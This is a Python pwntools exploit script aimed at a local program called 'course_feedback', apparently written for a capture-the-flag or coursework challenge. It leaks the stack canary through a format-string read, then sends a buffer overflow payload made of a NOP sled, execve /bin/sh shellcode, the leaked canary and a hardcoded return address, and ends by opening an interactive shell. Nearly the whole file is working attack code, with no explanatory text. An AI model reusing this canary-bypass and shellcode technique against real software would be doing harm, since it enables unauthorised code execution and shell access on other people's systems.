#!/usr/bin/env python
import struct
from pwn import *
import os

#context.clear(arch='amd64', kernel='amd64')

ex = process('course_feedback')

inp = ex.recv()
log.info("Printed: "+inp)

ex.sendline('%39$p')
canary = ex.recvline()
log.info('Canary Receivied: ' + canary)


can = int(canary.split()[-1],16)
log.info('Canary is: '+ str(can))

inp = ex.recv()
log.info("Printed: "+inp)


#shell = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x87\xe3\xb0\x0b\xcd\x80"
shell = "\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
buff_length = 0x274
ebp = 0xffffda68
#ebp = 0xffffd7cc

return_ptr = ebp - buff_length + 250
return_ptr_str = '\xee\xd8\xff\xff'

print format(return_ptr,'x')
print struct.pack("<I",return_ptr)

payload = ""
payload += "A"*16 
payload += "\x90"*500 
payload += shell 
payload += "B"* 60 + "C"*16 
payload += struct.pack("<I",can) 
payload += "D"*12 
#payload += struct.pack("<I",return_ptr)
payload += return_ptr_str

print "payload: " + payload
#gdb.attach(ex)
#raw_input("Send payload?")

ex.sendline(payload)
ex.recv()

os.system('sleep 2')

ex.interactive()
#ex.sendline('cat flag.txt')
#flag = ex.recv()
#print flag
